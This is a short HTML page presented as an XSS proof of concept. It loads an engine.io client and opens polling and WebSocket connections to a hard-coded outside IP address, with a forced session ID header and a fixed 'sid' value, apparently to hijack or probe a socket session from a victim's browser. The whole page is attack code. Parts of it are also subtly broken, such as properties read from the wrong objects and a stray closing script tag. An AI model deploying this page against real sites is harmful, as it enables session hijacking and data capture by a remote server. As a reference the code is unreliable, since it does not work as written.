<html>
<body>
<h1>
    POC for xss.Created by johnstone.
</h1>

<script src="/burp1.com/js/engine.io.js"></script>
<script>
  const socket = eio("https://154.43.165.231:8800/", { path: '/ws' ,transports: ["polling"],transportOptions: {
            polling: {
                extraHeaders: {
                    'x-session-id': 1
                }
              }
        }});
  socket.on("connect", () => {
      console.log(socket.io.engine.id); // prints something like "l9IoONULqVPQYa0DAAAA"
      const sessionId = socket.io.engine.id
  });
    
  const websocket = eio("https://154.43.165.231:8800/", { path: '/ws',transports: ["websocket"],query: { sid: "123" },transportOptions: {
            polling: {
                extraHeaders: {
                    'x-session-id': 1
                }
              }
        }});
  websocket.on("connect", () => {
    console.log(websocket.connected); // true
  });
  
  websocket.on("message", () => {
    console.log(websocket.data); // true
  });
    
  /*const socket = eio('wss://154.43.165.231:8800/ws');
  socket.on('open', () => {
    socket.on('message', (data) => {});
    socket.on('close', () => {});
  });*/
</script>
</script>
</body>
</html>
